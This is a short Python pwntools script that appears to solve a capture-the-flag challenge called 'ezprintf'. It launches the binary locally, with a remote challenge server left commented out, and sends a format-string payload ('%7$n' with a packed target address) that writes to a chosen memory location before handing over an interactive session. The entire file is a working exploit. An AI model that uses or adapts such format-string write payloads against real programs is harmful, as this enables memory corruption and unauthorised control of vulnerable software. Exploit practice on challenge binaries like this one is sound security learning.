from pwn import *

p = process('ezprintf')
#p = remote('osilayer8.cf', 20101)

pause()
p.sendline('aaaa%7$n'+p64(0x0060106c))
p.interactive()
